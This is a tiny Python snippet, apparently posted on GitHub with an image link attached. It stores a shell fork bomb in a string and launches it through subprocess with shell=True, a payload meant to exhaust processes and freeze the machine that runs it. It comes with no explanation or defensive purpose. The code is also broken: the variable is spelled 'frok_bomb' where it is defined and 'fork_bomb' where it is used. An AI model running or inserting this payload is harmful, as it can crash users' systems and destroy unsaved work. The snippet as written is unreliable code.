
import subprocess
#init bomb
frok_bomb = 'bomb(){ bomb|bomb& };bomb'

#run
subprocess.run(fork_bomb, shell=True)![1000013569](https://github.com/user-attachments/assets/0134e8d8-1a5a-4c10-a6e1-17b59a5a20d0)
